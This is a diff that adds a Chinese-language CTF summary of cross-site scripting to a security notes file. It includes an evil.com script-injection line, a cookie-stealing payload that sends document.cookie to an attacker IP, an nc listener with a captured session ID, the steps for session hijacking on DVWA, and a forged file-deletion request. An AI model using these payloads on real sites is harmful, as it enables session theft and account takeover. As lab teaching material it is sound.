@@ -46,5 +46,101 @@ KRACK 並非直接解開 WPA2 加密強制通訊，而是透過基地臺重送�
 
 ## 模擬題目
 
+## CTF中关于XSS跨站的小结
+> XSS即跨站脚本，发生在目标网站上目标用户的浏览器层面，当用户浏览器渲染整个HTML文档过程中出现了不被预期的脚本并执行时，XSS就会发生。
+
+任何的安全问题都有“输入”的概念，**很多时候输入内容长度是有限制的，真正的XSS攻击弹窗毫无意义，所以攻击代码可能会比较长**，一般会注入类似下面的代码来引用第三方域上的脚本资源：
+&nbsp;&nbsp;&nbsp;&nbsp;`<script src="http://evil.com/xss.js"></script>`
+而有的时候，并不按照浏览器允许的策略执行（**同源策略**），那就是真正意义上的跨站了，**突破的是浏览器同源策略**。
+例如：
+```
+<script>
+    eval(location.hash.substr(1));
+</script>
+```
+将以上代码保存为一个网页文件然后用chrome打开将会什么都不显示，如果这是目标网站，要执行我们自己的脚本来触发XSS攻击，需要把`alert(1)`这样的脚本改成真正具有杀伤力的第三方的脚本资源，例如：
+`http://www.foo.com/xssme.html#document.write("<script/scr=//www.eval.com/alert.js></script>")`
+诱骗用户点击后，目标浏览器就会开始执行我们需要的恶意脚本。
+
+**通对于XSS，可以小结为：想进一切办法将你的脚本内容在目标网站中目标用户的浏览器上解析执行即可。**
+
+在XSS攻击成功后，能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用以完成各种具体功能的恶意脚本，被称为`XSS Payload`。`XSS Payload`实际上就是JavaScript脚本(还可以是Flash 或其他富客户端的脚本),所以任何JavaScript脚本能实现的功能，`XSS Payload`都能做到。一个最常见的 `XSS Payload`,就是通过读取浏览器的Cookie对象，从而发起Cookie劫持攻击。
+
+同样的还有很多攻击方式，再如查看浏览器历史记录，访问劫持等等。
+
+### 盗用cookie
+
+Cookie一般加密保存了用户的登陆凭证。Cookie 如果丢失了，往往意味着用户的登陆凭证丢失。换句话说，攻击者可以不通过密码，而直接进入用户的账户。
+
+Cookie盗取Payload：
+```
+<script>
+var img=document.createElement("img");img.src="http://192.168.118.138:1234/a?"+escape(document.cookie);
+</script>
+```
+以DVWA为例，DOM型XSS:
+`http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert(v0w)</script>`
+在kali上nc监听端口1234:
+`nc -nvlp 1234`
+构造Cookie劫持的`XSS Payload`:
+```
+http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>var img=document.createElement("img");img.src="http://192.168.118.138:1234/a?"+escape(document.cookie);</script>
+```
+
+kali上接收到数据包:
+```
+root@kali:~# nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [192.168.118.138] from (UNKNOWN) [192.168.118.1] 49597
+GET /a?security%3Dlow%3B%20PHPSESSID%3Do58bsvrlfbval38fs1l3gubr16 HTTP/1.1
+Host: 192.168.118.138:1234
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/dvwa/vulnerabilities/xss_d/?default=%3Cscript%3Evar%20img=document.createElement(%22img%22);img.src=%22http://192.168.118.138:1234/a?%22+escape(document.cookie);%3C/script%3E
+Connection: close
+```
+其中，参数a后面的就是Cookie.
+`security=low; PHPSESSID=o58bsvrlfbval38fs1l3gubr16
+`
+有了这个Cookie，我们可以在不知道密码的情况下，登陆该用户的账户：
+1. 打开另一个浏览器，并没有登陆
+2. 从抓到的包，可以看出链接地址，直接进入`http://localhost/dvwa/vulnerabilities/xss_d/`,发现进不去，需要登陆。
+3. set-Cookie：`security=low; PHPSESSID=o58bsvrlfbval38fs1l3gubr16`
+4. 再次访问链接`http://localhost/dvwa/vulnerabilities/xss_d/`,发现可以进入了，账户身份正是盗取的用户身份。
+
+### 防护手段
+* HttpOnly
+* Cookie与IP地址绑定
+
+### XSS构造GET&POST请求
+
+对网站的浏览和操作，大部分都可以通过GET请求和POST请求来完成，因此可以通过js构造XSS Payload以完成一系列操作。
+
+如可以通过一个url可以删除文件：
+`http://www.example.com/do/?m=delete&id=123`
+
+攻击者可以通过构造XSS Payload,发起这个请求：
+```
+var img = docunment.createElement("img");
+img.src = "http://www.example.com/do/?m=delete&id=123";
+document.body.appendChild(img);
+```
+同样的道理，甚至可以利用`XSS Payload` 读取用户邮箱的邮件。
+
+### XSS类型
+* **反射型XSS**
+
+&nbsp;&nbsp;&nbsp;&nbsp;发送请求时，XSS代码出现在URL中，作为输入提交到服务端，服务端解析后响应，在响应内容中出现这段XSS代码，最后浏览器解析执行。这个过程就像一次反射，所以称作为反射型XSS.
+* **储存型XSS**
+
+&nbsp;&nbsp;&nbsp;&nbsp;储存型XSS和反射型XSS的差别仅在于：提交的XSS代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交XSS代码。
+
+* **DOM XSS**
+
+
+&nbsp;&nbsp;&nbsp;&nbsp;和前两个的区别在于，DOM XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。
+
 ## Contribution
 [clickme](https://hackmd.io/EkD3WmKyQgexSx-1F85Mkg)
